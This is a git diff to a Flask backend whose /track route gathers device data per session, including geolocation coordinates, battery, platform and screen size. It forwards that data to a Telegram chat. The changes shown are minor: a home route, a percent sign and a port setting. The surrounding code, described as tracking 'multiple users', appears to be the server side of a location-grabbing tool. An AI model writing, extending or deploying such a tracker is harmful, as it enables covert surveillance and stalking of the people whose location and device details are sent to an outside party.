@@ -24,6 +24,10 @@ def send_telegram_photo(image_url, caption):
     payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
     requests.post(TELEGRAM_PHOTO_API, json=payload)
 
+@app.route('/')
+def home():
+    return "Flask backend is live!"
+
 @app.route('/track/<session_id>', methods=['POST'])
 def track_device(session_id):
     """Track multiple users and send data to Telegram."""
@@ -47,7 +51,7 @@ def track_device(session_id):
 <b>{message_status}</b>
 📡 <b>Session ID:</b> {session_id}
 
-⚡ <b>Battery:</b> {battery.get("level", "N/A")} (Charging: {battery.get("charging", "N/A")})
+⚡ <b>Battery:</b> {battery.get("level", "N/A")}% (Charging: {battery.get("charging", "N/A")})
 🌍 <b>Geolocation:</b> Lat {geo.get("latitude", "N/A")}, Lon {geo.get("longitude", "N/A")}
 📱 <b>Device:</b> {device.get("platform", "N/A")}
 💻 <b>Screen:</b> {device.get("screenWidth", "N/A")}x{device.get("screenHeight", "N/A")}
@@ -69,4 +73,5 @@ def track_device(session_id):
         return {"error": str(e)}, 500
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
+    port = int(os.getenv("PORT", 10000))  # Use Render-assigned PORT or default 10000
+    app.run(host='0.0.0.0', port=port)
